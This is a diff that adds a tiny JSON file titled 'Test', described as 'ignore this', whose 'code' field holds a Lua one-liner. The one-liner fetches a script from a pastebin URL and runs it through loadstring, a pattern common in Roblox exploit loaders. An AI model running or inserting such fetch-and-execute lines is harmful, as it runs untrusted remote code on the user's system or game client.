@@ -1,0 +1,5 @@
+{
+  "title": "Test",
+  "description": "ignore this",
+  "code": "loadstring(game:HttpGet('https://pastebin.com/raw/XYZ123'))()"
+}
